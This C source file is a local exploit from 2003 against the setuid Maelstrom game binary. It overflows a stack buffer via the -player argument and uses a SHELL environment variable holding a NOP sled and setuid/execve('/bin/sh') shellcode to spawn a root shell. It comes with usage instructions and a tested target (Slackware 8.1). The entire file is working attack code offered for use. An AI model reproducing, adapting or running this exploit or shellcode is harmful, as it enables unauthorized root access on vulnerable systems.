/*
 * ==================================================
 * MaelstromX.c /usr/bin/Maelstrom local exploit
 * By: Knight420
 * 05/20/03
 *
 * Gr33tz to: sorbo, sonyy, sloth, and all of #open
 *
 *  -player or -server works
 * ( ./MaelstromX 100 3 ) works on slackware 8.1
 *
 * (C) COPYRIGHT Blue Ballz , 2003
 * all rights reserved
 * =================================================
 *
 */

#include <stdio.h>

#define STACK_START 0xC0000000
#define SWITCH "-player"

char shellcode[] =
        "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
        "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
        "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
        "\x31\xc0\x31\xdb\x31\xc9\xb0\x46\xcd\x80\xeb\x1d"
        "\x5e\x88\x46\x07\x89\x46\x0c\x89\x76\x08\x89\xf3"
        "\x8d\x4e\x08\x8d\x56\x0c\xb0\x0b\xcd\x80\x31\xc0"
        "\x31\xdb\x40\xcd\x80\xe8\xde\xff\xff\xff/bin/sh";

int main(int argc, char *argv[]) {
        char buff[8200];
        char buff2[8200];
        int *ptr;
        int ret;
        char *arg[] = { "Maelstrom",SWITCH,buff,NULL } ;
        char *env[] = { buff2, NULL };

        if(argc < 2) {
	      printf ("Maelstrom Local Exploit by: Knight420\n");  
              printf("Usage: %s <ret> <align>\n",argv[0]);
                exit(0);
        }

        ret = STACK_START - atoi(argv[1]);
	  memset(buff,'A',100);
        for(ptr = (int*)&buff[atoi(argv[2])]; ptr < (int*)&buff[8200]; ptr++)
                *ptr = ret;
        buff[sizeof(buff)-1] = 0;
        memcpy(buff,"1@",2);

        snprintf(buff2,sizeof(buff2),"SHELL=%s",shellcode);
	  printf ("Maelstrom Local Exploit by: Knight420\n");
        printf ("Return Addr: %p\n",ret);
        printf ("Spawning sh3ll\n");
        execve("/usr/local/bin/Maelstrom",arg,env);
}


